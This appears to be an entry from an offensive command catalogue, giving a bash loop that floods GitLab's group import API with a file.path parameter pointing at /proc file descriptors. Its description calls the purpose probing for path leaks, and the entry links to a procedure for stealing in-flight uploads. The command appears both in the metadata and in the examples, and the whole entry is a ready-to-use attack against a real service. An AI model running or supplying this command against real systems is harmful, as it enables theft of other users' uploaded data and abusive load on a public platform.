---
data: >-
  while true; do curl -H "Authorization: Bearer $TOKEN_R" -F
  'lala=@/tmp/lala.txt'
  'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/9348/fd/145'
  ; done
tags:
  - loop
  - probing
type: command
executor: bash
platforms:
  - Web
id: 9cc320ca-668c-4fe1-9762-8da0c05e7721
created_at: '2025-12-11T06:10:15.390Z'
updated_at: '2025-12-11T06:10:15.390Z'
verified: false
validated: true
submitted: true
---
# loop-probe-file-descriptors

## Command

```bash
while true; do curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/9348/fd/145' ; done
```

## Description

Loops to probe file descriptors for path leaks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `while true` | Loop | Yes |
| `curl -H` | Request | Yes |
| `?file.path=/proc/9348/fd/145` | Probe | Yes |

## Examples

### Basic Usage

```bash
while true; do curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/9348/fd/145' ; done
```

## Expected Output

Multiple 500 errors, eventually path leak like '/var/log/gitlab/gitlab-rails/database_load_balancing.log'

## Related

- [[procedures/Steal-In-Flight-Uploads-via-Proc-FD-Looping]]
